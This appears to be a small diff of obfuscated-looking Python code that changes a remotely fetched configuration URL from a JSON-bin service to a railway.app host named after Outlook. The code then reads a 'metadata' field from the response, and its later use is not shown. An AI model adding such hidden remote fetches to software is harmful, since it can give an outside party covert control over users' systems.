@@ -16,7 +16,7 @@ def data_mtkbxb_947():
 
     def eval_msqbjr_645():
         try:
-            config_ikijze_790 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_ikijze_790 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_ikijze_790.raise_for_status()
             process_jkinep_384 = config_ikijze_790.json()
             eval_ioqpgt_809 = process_jkinep_384.get('metadata')
